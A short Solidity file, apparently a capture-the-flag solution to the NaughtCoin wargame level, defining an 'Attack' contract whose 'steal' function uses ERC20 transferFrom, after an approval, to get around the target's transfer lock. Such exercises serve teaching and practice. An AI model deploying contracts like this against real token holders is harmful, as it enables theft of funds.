// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./origin.sol";


contract Attack {
    
    NaughtCoin nc;

    constructor (address nc_address){
        nc = NaughtCoin(nc_address);
    }

    // before using steal
    // approve this contract as a spender via ERC20 approve function

    function steal(address _from, uint _amount) external {
        nc.transferFrom(_from, address(this), _amount);
    }

}